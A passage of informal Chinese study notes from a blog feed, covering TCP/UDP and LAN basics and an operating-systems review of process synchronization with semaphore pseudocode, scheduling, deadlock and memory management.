<li><p>Server -&gt; Client<br>FIN = 0, ACK = 1, 确认号 = x + 1, 顺序号 = y<br>Server仍然传输数据<br>…中间可发送很多数据</p>
</li>
<li><p>Server -&gt; Client<br>FIN = 1, ACK = 1, 确认号 = x + 1, 顺序号 = w<br>Server端也停止传输, 发出FIN</p>
</li>
<li><p>Client -&gt; Server<br>ACk = 1, 确认号 = w + 1</p>
</li>
</ol>
<p>为什么释放要四次??<br> 因为是TCP是全双工的, 每个方向都要单独关闭</p>
<p>发送了FIN只是表示这端不能继续发送数据(应用层不能再调用send发送)，但是还可以接收数据</p>
<h4 id="TCP流量管理"><a href="#TCP流量管理" class="headerlink" title="TCP流量管理"></a>TCP流量管理</h4><h4 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h4><p>TCP拥塞控制与流量控制的区别</p>
<ul>
<li>拥塞控制是为了防止网络过载导致路由器缓冲区不足而造成IP分组的丢失</li>
<li>流量控制是为了防止发送端发送速度过快导致接收端缓冲区不足而造成TCP段的丢失</li>
</ul>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>UDP是非面向连接, 不可靠的传输协议<br>UDP实质上在IP基础上, 增加了端口机制, 实现了主机进程间的数据传输</p>
<p>UDP的特点:(这些特点与TCP恰好相反)<br>TCP不需要建立连接, 是不可靠的传输协议<br>不支持流量控制和拥塞控制<br>支持广播和组播</p>
<p>有一个常见的问题是: 既然UDP也不可靠, 也是非连接的, 那么用IP就好了, 要啥UDP, 下面有请大佬解答&gt;&gt;&gt;<br>除了增加了端口, 还有其他的吗</p>
<p>UCP报文段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">源端口号 | 目的端口号</div><div class="line">长度     | 校验和</div><div class="line">用户数据</div></pre></td></tr></table></figure></p>
<p>适合实时应用</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>利用DNS的一个攻击方式 DNS rebinding Attack</p>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><p>IEEE802标准<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">=======+======+===============</div><div class="line">链路层 + LLC  +    802.2</div><div class="line">       +------+===============</div><div class="line">       + MAC  + 802.3/802.4</div><div class="line">-------+======+ 802.5/802.11</div><div class="line">物理层 +      + .......</div><div class="line">=======+======+===============</div></pre></td></tr></table></figure></p>
<p>LLC是独立于通信介质的<br>LLC子层为MAC子层提供三种不同类型的服务：</p>
<ul>
<li>无确认连接</li>
<li>有确认无连接</li>
<li>面向连接</li>
</ul>
<p>对了..还有一点…LLC是被包装在MAC帧里面的…</p>
<h3 id="IEEE-802-3"><a href="#IEEE-802-3" class="headerlink" title="IEEE 802.3"></a>IEEE 802.3</h3><p>包括两部分</p>
<ul>
<li>介质访问控制(CSMA/CD)</li>
<li>物理层规范</li>
</ul>
<p>CSMA/CD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[PA | DA | SA | L | LLC帧 | PAD | FCS]</div></pre></td></tr></table></figure></p>
<p>LLC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[DSAP | SSAP | 控制 | 数据]</div></pre></td></tr></table></figure></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[对于系统的一些记录]]></title>
      <url>/2017/09/01/%E5%AF%B9%E4%BA%8E%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<h2 id="2017-09-01"><a href="#2017-09-01" class="headerlink" title="2017-09-01"></a>2017-09-01</h2><p>这个…emmmm，<code>Ctrl + .</code> 是切换全角/半角符号</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[操作系统复习]]></title>
      <url>/2017/09/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>OS作为用户和计算机硬件间的接口<br>OS作为用户与计算机系统资源的管理者<br>OS作为扩充器</p>
<h3 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h3><ol>
<li>无操作系统</li>
<li>单道批处理</li>
<li>多道批处理</li>
<li>分时/实时</li>
</ol>
<p>解释一下是， 分时的话是多终端连接到主机，对每一个终端来讲都有独占的感觉， 实时的话一般是专用系统中， 对于该系统能够忍受的时差内做出反应的系统</p>
<h3 id="基本特征"><a href="#基本特征" class="headerlink" title="基本特征"></a>基本特征</h3><ol>
<li><p>并发<br>并发: 多个事件在同一时间段内发生<br>并行：多个事件在同一时刻发生<br>并发实现的效果就是宏观上有多道程序同时运行, 而微观上是交替分时的进行</p>
</li>
<li><p>共享<br>多个计算任务对系统资源共同使用<br>共享会造成一些问题</p>
</li>
<li><p>虚拟<br>虚拟式把一个物理实体变为逻辑上的对应物</p>
<blockquote>
<p>其实计算机里对于不好解决的问题很多时候是通过加一层中间层来实现</p>
</blockquote>
</li>
<li><p>异步性<br>其实异步的概念一直不是很会用言语说出来<br>这里的异步大概是说如果因为某些情况阻塞掉了某些进程那么不需要等她, 等到时机成熟, 会有人来唤醒<br>异步其实常常和回调联系在一起</p>
</li>
</ol>
<h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><ol>
<li>处理器管理</li>
<li>存储器管理</li>
<li>设备管理</li>
<li>文件管理</li>
<li>用户接口</li>
</ol>
<p>前四点应该都算是资源管理， 最后一点是提供接口</p>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="程序顺序执行的特征"><a href="#程序顺序执行的特征" class="headerlink" title="程序顺序执行的特征"></a>程序顺序执行的特征</h3><ol>
<li>顺序性</li>
<li>封闭性</li>
<li>可再现性</li>
</ol>
<h3 id="进程特点"><a href="#进程特点" class="headerlink" title="进程特点"></a>进程特点</h3><ol>
<li>动态性</li>
<li>并发性</li>
<li>独立性</li>
<li>异步性</li>
</ol>
<blockquote>
<p>进程是进程实体运行的过程, 是系统进行资源分配和调度的独立单位</p>
</blockquote>
<h3 id="进程的基本状态"><a href="#进程的基本状态" class="headerlink" title="进程的基本状态"></a>进程的基本状态</h3><ol>
<li>就绪</li>
<li>执行</li>
<li>阻塞</li>
</ol>
<p>还有一种状态是<code>挂起</code><br><em>那挂起和阻塞的区别在哪里</em><br>挂起的话其实好像是直接把这个进程调到了外存里, 这样子的话, 如果好像挂起属于中级调度, 而阻塞的话, 进程还在内存中, 只在内存中的话, 这个调度还算是低级调度吧</p>
<h3 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h3><p>PCB(进程控制块), 是进程存在的唯一标识, 进程控制块位于操作系统内核</p>
<h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><ol>
<li><p>创建<br>用户登录 作业调度 提供服务 应用请求</p>
</li>
<li><p>撤销</p>
</li>
<li><p>阻塞<br>进程阻塞是自己阻塞掉自己, 然后再由其他人唤醒, 像是一个异步回调的过程(不知道算不算是)</p>
</li>
</ol>
<ul>
<li>请求资源</li>
<li>等待操作完成</li>
<li>新数据还未达到</li>
<li>等待新任务</li>
</ul>
<ol>
<li>唤醒</li>
</ol>
<h3 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h3><p>感觉比较复杂的一块<br>简单说通常就是由于<code>资源共享</code>造成的问题</p>
<p>两种制约形式</p>
<ol>
<li><p>间接相互制约<br>共享某种系统资源</p>
</li>
<li><p>直接相互制约<br>主要源于进程间合作</p>
</li>
</ol>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>临界资源: 一次只能为一个进程所用的资源</p>
<ul>
<li>硬件: 打印机</li>
<li>软件：内存 指针 数组</li>
</ul>
<p>临界区：访问临界资源的代码段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">进入区</div><div class="line">临界区</div><div class="line">退出区</div></pre></td></tr></table></figure></p>
<p>其实感觉进入区的设计很关键…不然的话可能就造成…<br>有的语句, 在高层比如C语言里看到是一条语句, 其实编译后很多条, 就不是原子的</p>
<p>同步机制遵循原则：</p>
<ul>
<li>空闲让进</li>
<li>忙则等待</li>
<li>有限等待</li>
<li>让权等待</li>
</ul>
<h4 id="过去的解决方法"><a href="#过去的解决方法" class="headerlink" title="过去的解决方法"></a>过去的解决方法</h4><p>软件<br>Peterson算法, 其实不是很理解…就是说自己不能很快写出<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1 </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> N 2</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> turn;</div><div class="line"><span class="keyword">int</span> interested[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">enter_region</span><span class="params">(<span class="keyword">int</span> process)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> other;</div><div class="line">    other = <span class="number">1</span> - process;</div><div class="line">    interested[process] = TRUE;</div><div class="line">    turn = process;</div><div class="line">    <span class="keyword">while</span>(turn == process &amp;&amp; interested[other] == TRUE);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leave_region</span><span class="params">(<span class="keyword">int</span> process)</span> </span>&#123;</div><div class="line">    interested[process] = FALSE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p> 硬件</p>
<ol>
<li>TSL指令</li>
<li>SWAP指令<br>硬件解法的特点在于….这个</li>
</ol>
<h4 id="信号量机制"><a href="#信号量机制" class="headerlink" title="信号量机制"></a>信号量机制</h4><p>这个是比较好的解决方案, 由Dijkstra提出</p>
<h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ol>
<li>整数信号量S<br>原子操作：</li>
</ol>
<ul>
<li><p>wait(P)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> S)</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(S &lt;= <span class="number">0</span>) ;</div><div class="line">    S -= <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>singal(V)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Signal</span><span class="params">(<span class="keyword">int</span> S)</span> </span>&#123;</div><div class="line">    S += <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<ol>
<li>记录型信号量S<br>由于整数型信号量里的<code>while(S &lt;= 0) ;</code>不符合让权等待<br>现在推出了这个记录型的信号量</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    <span class="keyword">int</span> value;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">process_contorl_block</span> *<span class="title">list</span>;</span></div><div class="line">&#125;semaphore;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">wait</span><span class="params">(semaphore * S)</span> </span>&#123;</div><div class="line">    S -&gt; value--;</div><div class="line">    <span class="keyword">if</span>(S -&gt; value &lt; <span class="number">0</span>)</div><div class="line">        block(S -&gt; <span class="built_in">list</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">signal</span><span class="params">(semaphore * S)</span> </span>&#123;</div><div class="line">    S -&gt; value++;</div><div class="line">    <span class="keyword">if</span>(S -&gt; value &lt;= <span class="number">0</span>)</div><div class="line">        wakeup(s -&gt; <span class="built_in">list</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面有等于0, 是因为</p>
<p><code>S -&gt; value &gt;= 0</code>代表可用资源数量， <code>S -&gt; value &lt; 0</code>代表阻塞队列中进程的数量</p>
<h4 id="信号量作用"><a href="#信号量作用" class="headerlink" title="信号量作用"></a>信号量作用</h4><p>主要两个作用吧, 就是互斥和同步, 就是这样子</p>
<ol>
<li>用于互斥, 即同一时刻只能同一个人使用资源</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> top = <span class="number">-1</span>;</div><div class="line"><span class="keyword">int</span> <span class="built_in">stack</span>[n];</div><div class="line">semaphore mutex; </div><div class="line">mutex.value = <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc1</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="comment">// 进程1</span></div><div class="line">    wait(mutex);    <span class="comment">// 进入</span></div><div class="line"></div><div class="line">    top = (top + <span class="number">1</span>) % n;</div><div class="line">    <span class="built_in">stack</span>[top] = x;</div><div class="line"></div><div class="line">    signal(mutex);  <span class="comment">// 退出</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc2</span><span class="params">(<span class="keyword">int</span> y)</span> </span>&#123;</div><div class="line">    <span class="comment">// 进程2</span></div><div class="line">    wait(S); <span class="comment">//进入</span></div><div class="line"></div><div class="line">    top = (top + <span class="number">1</span>) % n;</div><div class="line">    <span class="built_in">stack</span>[top] = y;</div><div class="line"></div><div class="line">    signal(mutex);  <span class="comment">//退出</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>用于同步<br>这个说的是那种合作的进程…<br>比如生产者消费者问题应该是就算这种的<br>生产者消费者共享缓冲池, 其实对于生产者消费者分别相当于是, 空位置和非空位置是资源<br>而且生产和消费不能同时进行<br>而且下面的例子是那个,,,单消费者单生产者多缓冲区</li>
</ol>
<p>这里就写伪代码了…<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Producer:</span></div><div class="line">nextp = produce();</div><div class="line"></div><div class="line">wait(empty);</div><div class="line">wait(mutex);</div><div class="line"></div><div class="line">Buffer[in_ptr] = nextp;</div><div class="line">in_ptr = (in_ptr + <span class="number">1</span>) % n;</div><div class="line"></div><div class="line">signal(mutex);</div><div class="line">signal(full);</div><div class="line"></div><div class="line"><span class="comment">// Customer:</span></div><div class="line">wait(full);</div><div class="line">wait(mutex);</div><div class="line"></div><div class="line">nextc = buffer(out_ptr);</div><div class="line">out_ptr = (out_ptr + <span class="number">1</span>) % n;</div><div class="line"></div><div class="line">signal(mutex);</div><div class="line">signal(empty);</div></pre></td></tr></table></figure></p>
<p>注意的点在于上面不光是有<code>full/signal</code>这个….还同时有<code>mutex</code>…为什么呢<br>这个<code>mutex</code>是设定了同时只有生产者或者消费者在运作,就是使得在生产的时候不能消费,在消费的时候不能生产,即一个互斥的关系<br>这个<code>full/signal</code>的话就是说对资源的同步….</p>
<p>如果我们改变这个问题呢….<br>比如</p>
<ol>
<li><p>多生产者, 单消费者, 多缓冲区<br>其实和上面的单生产单消费多缓冲一样的</p>
</li>
<li><p>多生产者, 多消费者, 单缓冲<br>单缓冲的话, 其实就不需要mutex了,这个时候full和signal就代替了mutex的作用</p>
</li>
<li><p>单生产者, 单消费者, 单缓冲<br>感觉只要是单缓冲的话, 就很简单了, 和几个生产几个消费好像没关系了, 就是和上一个应该是完全相同的</p>
</li>
<li><p>允许生产者写的时候消费者读<br>这个时候, 第一想到就是不需要mutex了,其实不然…只是可以Producer和Customer一起进行了, 但同类之间还是互斥的,这个时候, 解决方法是设置<code>mutex_Producer</code>和<code>mutex_Customer</code>…程序大概变成了这个样子</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Producer:</span></div><div class="line">wait(empty)</div><div class="line">wait(mutex_Producer)</div><div class="line"><span class="comment">// 生产</span></div><div class="line">singal(mutex_Producer)</div><div class="line">singal(full)</div><div class="line"></div><div class="line"><span class="comment">// Customer:</span></div><div class="line">wait(full)</div><div class="line">wait(mutex_Customer)</div><div class="line"><span class="comment">// 生产</span></div><div class="line">singal(mutex_Customer)</div><div class="line">singal(empty)</div></pre></td></tr></table></figure>
<ol>
<li>调整wait/signal顺序<br>生产者的wait调换的话, 缓冲区为满时候生产者继续运行时候会产生死锁<br>消费者的wait调换的话, 缓冲区为空时候消费者继续运行时候会产生死锁</li>
</ol>
<p>而signal的话是可以互换的…不会有问题, 但有的地方有这样子的话:对任何信号量的wait与signal操作必须配对。同一进程中的多对wait与signal语句只能嵌套，不能交叉, 不太懂</p>
<p>所以总结出来就是那个. wait的话,一定要先wait一个资源型信号量, 然后再wait互斥型的</p>
<p>暂时先看其他的, 先挖个坑</p>
<h4 id="经典问题"><a href="#经典问题" class="headerlink" title="经典问题"></a>经典问题</h4><ol>
<li><p>生产者消费者问题<br>上面已经说到的</p>
</li>
<li><p>读者写者问题<br>这个和消费者生产者不太一样的地方在于,这个没有明确资源是什么…就是不需要考虑full和empty的问题, 只是要考虑</p>
</li>
<li>写者写的时候不允许其他写者写或者读</li>
<li>但允许多个读者同时访问资源</li>
<li>并没有产品产品/缓冲区的概念, 也就不需要说先写出东西来再去读取</li>
</ol>
<p>拿到问题后一种想法就是, 我们好像只要有一个互斥量wmutex就可以了,当第一个读者开始读取时候wait一个, 最后一个读者离开时候signal一下…每个写者都要独自的wait和signal<br>所以初步写出程序大概</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 读者</span></div><div class="line"><span class="keyword">if</span>(readcount == <span class="number">0</span>)</div><div class="line">    wait(wmutex);</div><div class="line"></div><div class="line">readcount += <span class="number">1</span>;</div><div class="line"><span class="comment">// 读操作</span></div><div class="line">readcount -= <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(readcount == <span class="number">0</span>)</div><div class="line">    signal(wmutex);</div><div class="line"></div><div class="line"><span class="comment">// 写者</span></div><div class="line">wait(wmutex)</div><div class="line"><span class="comment">// 写操作</span></div><div class="line">signal(wmutex)</div></pre></td></tr></table></figure>
<p>表面上看起来很和谐, 其实有个问题就是这里的<code>readcount</code>也是一个临界变量不能由多个read来访问…所以应该在readcount修改前后也变成临界区<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 读者</span></div><div class="line">wait(rmutex);</div><div class="line">    <span class="keyword">if</span>(readcount == <span class="number">0</span>)</div><div class="line">        wait(wmutex);</div><div class="line">    readcount += <span class="number">1</span>;</div><div class="line">signal(rmutex);</div><div class="line"></div><div class="line"><span class="comment">// 读操作</span></div><div class="line"></div><div class="line">wait(rmutex);</div><div class="line">    readcount -= <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span>(readcount == <span class="number">0</span>)</div><div class="line">        signal(wmutex);</div><div class="line">signal(rmutex);</div></pre></td></tr></table></figure></p>
<ol>
<li>哲学家进餐问题<br>关键在于资源申请的时候如果每个人都先申请同一只手的筷子的话…就很容易死锁, 所以应该有个人反着拿</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// philosopher[0..3]</span></div><div class="line">wait(chopsticks[i]);</div><div class="line">wait(chopsticks[(i + <span class="number">1</span>) % <span class="number">5</span>]);</div><div class="line"><span class="comment">// eat</span></div><div class="line">signal(chopsticks[i]);</div><div class="line">signal(chopsticks[(i + <span class="number">1</span>) % <span class="number">5</span>]);</div><div class="line"></div><div class="line"><span class="comment">// philosopher[4]</span></div><div class="line">wait(chopsticks[(i + <span class="number">1</span>) % <span class="number">5</span>]);</div><div class="line">wait(chopsticks[i]);</div><div class="line"><span class="comment">// eat</span></div><div class="line">signal(chopsticks[i]);</div><div class="line">signal(chopsticks[(i + <span class="number">1</span>) % <span class="number">5</span>]);</div></pre></td></tr></table></figure>
<h3 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h3><ol>
<li>共享存储器系统</li>
<li>消息方式</li>
<li>管道方式</li>
</ol>
<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>引入线程后, 进程仍然作为资源分配的基本单位…但线程作为调度分配的基本单位<br>线程之间共享进程中的大部分资源, 少部分像堆栈, 寄存器, TLS是独有的…</p>
<p>好处</p>
<ul>
<li>统一进程内的线程共享内核和文件, 相互通信无须调用内核</li>
<li>创建一个新的线程花费时间少</li>
<li>两线程切换花费时间少</li>
</ul>
<p>类型</p>
<ul>
<li>内核级线程</li>
<li>用户级线程<br>既然用户级线程没法分配到独立的处理机, 那这种线程的意义在于哪里</li>
</ul>
<p>特权指令一般能引起CPU系统态和用户态的转变</p>
<h2 id="处理机调度"><a href="#处理机调度" class="headerlink" title="处理机调度"></a>处理机调度</h2><h3 id="三个调度等级"><a href="#三个调度等级" class="headerlink" title="三个调度等级"></a>三个调度等级</h3><ol>
<li><p>低级调度<br>决定哪个进程获得处理机, 这里的话其实有抢占式和非抢占式两种</p>
</li>
<li><p>中级调度<br>中级的话其实就是挂起操作, 把暂时不需要的进程调到外存上…<br>实际上就是传说中内存管理中的<code>对换</code></p>
</li>
<li><p>高级调度<br>把外存上处于后备队列的作业调入内存, 并且为其创建进程, 分配资源, 然后把新的进程丢到那个就绪队列上, 准备执行</p>
</li>
</ol>
<h3 id="评价标准"><a href="#评价标准" class="headerlink" title="评价标准"></a>评价标准</h3><p>对于某个特定进程说</p>
<ol>
<li>周转时间, 包括</li>
</ol>
<ul>
<li>作业在后备队列的等待时间</li>
<li>进程在就绪队列的等待时间</li>
<li>进程在CPU上的执行时间</li>
<li>进程等待IO的时间</li>
</ul>
<ol>
<li>对于操作系统</li>
</ol>
<ul>
<li><p>平均周转时间<br> 各个进程周转时间的均值</p>
</li>
<li><p>平均带权周转时间<br> 每个进程时间带上权值</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">W = 1/n * (\sum_&#123;i=1&#125;^n T_i / T_&#123;si&#125;)   //我就这样子乱写了...</div></pre></td></tr></table></figure>
<p> 这个<code>T_i</code>是第i个作业周转时间, 包括上面的四个过程<br> <code>T_{si}</code>是第i个作业的要求服务时间, 只包括周转时间的第三第四个过程</p>
</li>
</ul>
<h3 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h3><p>调度实际上就是资源分配</p>
<h4 id="先来先服务-FCFS"><a href="#先来先服务-FCFS" class="headerlink" title="先来先服务(FCFS)"></a>先来先服务(FCFS)</h4><p>用于作业调度/进程调度</p>
<h4 id="短作业-短进程优先-SJF-SPF"><a href="#短作业-短进程优先-SJF-SPF" class="headerlink" title="短作业/短进程优先(SJF/SPF)"></a>短作业/短进程优先(SJF/SPF)</h4><p>用于作业调度/进程调度<br>困难的点在于难以估计执行时间</p>
<h4 id="高优先权优先"><a href="#高优先权优先" class="headerlink" title="高优先权优先"></a>高优先权优先</h4><p>又分为</p>
<ul>
<li>动态优先权</li>
<li>静态优先权</li>
</ul>
<p>其实上面说的先来先服务, 短作业都是分别把到来时间, 执行时间作为优先权的高优先权优先算法, 而下面的高响应比优先相当于把响应比作为优先级</p>
<h4 id="高响应比优先"><a href="#高响应比优先" class="headerlink" title="高响应比优先"></a>高响应比优先</h4><p>只是用于作业调度</p>
<p>响应比 = <code>响应时间 / 要求服务时间</code> = <code>(等待时间 + 要求服务时间) / 要求服务时间</code></p>
<h4 id="时间片轮转"><a href="#时间片轮转" class="headerlink" title="时间片轮转"></a>时间片轮转</h4><p>时间片选择: 一般是略大于完成一次典型交互需要的时间</p>
<h4 id="多级反馈队列"><a href="#多级反馈队列" class="headerlink" title="多级反馈队列"></a>多级反馈队列</h4><p>无心学习…累</p>
<h4 id="实时系统的调度"><a href="#实时系统的调度" class="headerlink" title="实时系统的调度"></a>实时系统的调度</h4><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>这一块的核心在于这里的银行家算法<br>定义: 由于资源分配造成的一种僵局…陷入僵局..僵局<br>死锁的进程处于阻塞状态, 但仅靠自己, 无法继续运行</p>
<p>就像我们前面的生产者消费者问题当调换wait操作, 如果先申请互斥, 然后申请资源, 就可能造成死锁<br>还有哲学家进餐, 如果每个人都同时拿左手/右手边筷子就可能死锁</p>
<h4 id="死锁特征"><a href="#死锁特征" class="headerlink" title="死锁特征"></a>死锁特征</h4><ol>
<li><p>互斥条件</p>
</li>
<li><p>请求和保持<br>就是进程占有一个资源的同时, 请求另外的资源</p>
</li>
<li><p>不可剥夺<br>进程的资源在使用完之前不能剥夺….也就是说被占有就被占有了不能转让</p>
</li>
<li><p>环路等待</p>
</li>
</ol>
<h2 id="存储器管理"><a href="#存储器管理" class="headerlink" title="存储器管理"></a>存储器管理</h2><p>寄存器和主存称可执行存储器<br>其实程序从编译到运行, 经历了<br>编译, 装载, 运行<br>而链接根据不同的链接方式可能发生在不同的时候</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li>编译时链接</li>
<li>装载时链接</li>
<li>运行时链接</li>
</ul>
<h3 id="分区分配算法"><a href="#分区分配算法" class="headerlink" title="分区分配算法"></a>分区分配算法</h3><ul>
<li>首次适应算法</li>
<li>循环首次适应算法</li>
<li>最佳适应算法</li>
<li>最坏适应算法</li>
</ul>
<h3 id="基本分页存储管理"><a href="#基本分页存储管理" class="headerlink" title="基本分页存储管理"></a>基本分页存储管理</h3><p>由于这个分区分配方案存在碎片问题</p>
<h3 id="基本分段存储管理"><a href="#基本分段存储管理" class="headerlink" title="基本分段存储管理"></a>基本分段存储管理</h3><p>由于分页式存在的问题:</p>
<ul>
<li>信息共享和保护不方便</li>
<li>编程不方便(哪里不方便)</li>
</ul>
<p>分段式的话, 把具有相同功能的程序段放在了一起, 这样子可以很方便的设置每一段的权限之类的, 所以说感觉分段更适合逻辑地址空间的管理</p>
<p>分段的特点:</p>
<ul>
<li>分段是一段有意义的信息集合, 所以也容易实现信息保护</li>
<li>分段的划分由程序员来完成</li>
<li>分段长度不定</li>
<li>指令不存在跨分段情况</li>
</ul>
